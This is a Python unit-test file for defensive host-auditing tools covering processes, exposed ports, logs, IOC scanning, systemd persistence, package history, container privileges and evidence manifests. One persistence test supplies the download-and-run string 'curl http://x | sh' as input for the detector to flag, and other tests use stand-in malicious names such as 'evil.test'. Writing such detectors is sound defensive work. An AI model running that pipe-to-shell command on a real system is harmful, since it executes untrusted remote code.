import hashlib
import tempfile
import unittest
from pathlib import Path

from containeraudit import classify_findings as classify_container_findings
from containeraudit import parse_container_rows, parse_inspect
from evidencetrail import build_manifest, parse_targets, verify
from iocscan import parse_iocs, scan_file
from logtriage import classify_findings as classify_log_findings
from logtriage import triage_lines
from netaudit import classify_address, classify_findings as classify_net_findings
from persistwatch import parse_systemd_unit, suspicious_reasons
from pkgledger import parse_apk, parse_apt_history, parse_dpkg, parse_rpm
from procaudit import classify_process, parse_ps


class ProcauditTests(unittest.TestCase):
    def test_parse_ps_redacts_args(self):
        rows = parse_ps("PID PPID USER COMMAND %CPU %MEM ELAPSED COMMAND\n1 0 root bash 0.1 0.2 01:00 bash --token secret\n")

        self.assertEqual(rows[0]["pid"], 1)
        self.assertNotIn("secret", rows[0]["args"])

    def test_classify_deleted_executable(self):
        reasons = classify_process({"comm": "evil", "args": "evil", "exe": "/tmp/evil (deleted)", "cwd": "/"})

        self.assertIn("executable appears deleted", reasons)


class NetauditTests(unittest.TestCase):
    def test_classify_address(self):
        self.assertEqual(classify_address("0.0.0.0"), "all-interfaces")
        self.assertEqual(classify_address("127.0.0.1"), "loopback")

    def test_public_redis_is_critical(self):
        findings = classify_net_findings([{"port": "6379", "exposure": "all-interfaces"}])

        self.assertEqual(findings[0]["severity"], "CRITICAL")


class LogtriageTests(unittest.TestCase):
    def test_triage_counts_auth_failures(self):
        summary = triage_lines(["sshd: Failed password for invalid user admin", "kernel: Out of memory"])

        self.assertEqual(summary["counts"]["auth_failed"], 1)
        self.assertEqual(summary["counts"]["oom"], 1)
        self.assertEqual(classify_log_findings(summary)[0]["severity"], "WARN")


class IocscanTests(unittest.TestCase):
    def test_parse_iocs(self):
        parsed = parse_iocs("sha256: abc\npath:/tmp/x\ndomain:evil.test\n")

        self.assertEqual(parsed["path"], ["/tmp/x"])
        self.assertEqual(parsed["domain"], ["evil.test"])

    def test_scan_file_hash_and_content(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "sample.txt"
            path.write_text("beacon evil.test", encoding="utf-8")
            digest = hashlib.sha256(path.read_bytes()).hexdigest()

            matches = scan_file(path, {"sha256": [digest], "path": [], "domain": ["evil.test"], "ip": [], "text": []}, 1000)

            self.assertEqual({item["type"] for item in matches}, {"sha256", "content"})


class PersistwatchTests(unittest.TestCase):
    def test_parse_systemd_unit(self):
        unit = parse_systemd_unit("[Service]\nUser=www-data\nExecStart=/usr/bin/app\n")

        self.assertEqual(unit["User"], ["www-data"])
        self.assertEqual(unit["ExecStart"], ["/usr/bin/app"])

    def test_suspicious_reasons_flags_download(self):
        self.assertTrue(suspicious_reasons("curl http://x | sh"))


class PkgledgerTests(unittest.TestCase):
    def test_parse_dpkg(self):
        packages = parse_dpkg("ii  openssh-server  1:9.2p1  amd64\nrc  old  1  amd64\n")

        self.assertEqual(packages[0]["name"], "openssh-server")

    def test_parse_rpm(self):
        packages = parse_rpm("openssh-server-9.2-1.el9.x86_64\n")

        self.assertEqual(packages[0]["name"], "openssh-server")

    def test_parse_apk_keeps_hyphenated_name(self):
        packages = parse_apk("openssh-server-9.9_p2-r0\n")

        self.assertEqual(packages[0]["name"], "openssh-server")
        self.assertEqual(packages[0]["version"], "9.9_p2-r0")

    def test_parse_apt_history(self):
        events = parse_apt_history("Start-Date: 2026-06-01  10:00:00\nRemove: auditd:amd64 (1)\n")

        self.assertEqual(events[0]["action"], "remove")


class ContainerauditTests(unittest.TestCase):
    def test_parse_container_rows_json(self):
        rows = parse_container_rows('{"ID":"abc","Image":"nginx","Names":"web","Ports":"0.0.0.0:80->80/tcp","Status":"Up"}\n', "docker")

        self.assertEqual(rows[0]["names"], "web")

    def test_parse_inspect_and_classify_privileged(self):
        inspected = parse_inspect('[{"Id":"abcdef","Name":"/web","HostConfig":{"Privileged":true,"NetworkMode":"host","Binds":["/:/host:rw"]},"Config":{"User":"root"}}]')
        findings = classify_container_findings([], inspected)

        self.assertEqual(findings[0]["severity"], "CRITICAL")
        self.assertTrue(any("host networking" in item["message"] for item in findings))


class EvidencetrailTests(unittest.TestCase):
    def test_parse_targets_skips_comments(self):
        self.assertEqual(parse_targets("# a\n/tmp/a\n\n"), ["/tmp/a"])

    def test_build_manifest_and_verify_change(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "target.txt"
            target.write_text("before", encoding="utf-8")
            state = Path(tmp) / "state"
            manifest = build_manifest([str(target)], 10, 1024)
            case_dir = state / "evidencetrail" / "case1"
            case_dir.mkdir(parents=True)
            (case_dir / "manifest.json").write_text(__import__("json").dumps(manifest), encoding="utf-8")
            target.write_text("after", encoding="utf-8")

            result = verify("case1", str(state))

            self.assertEqual(result["overall"], "CRITICAL")


if __name__ == "__main__":
    unittest.main()
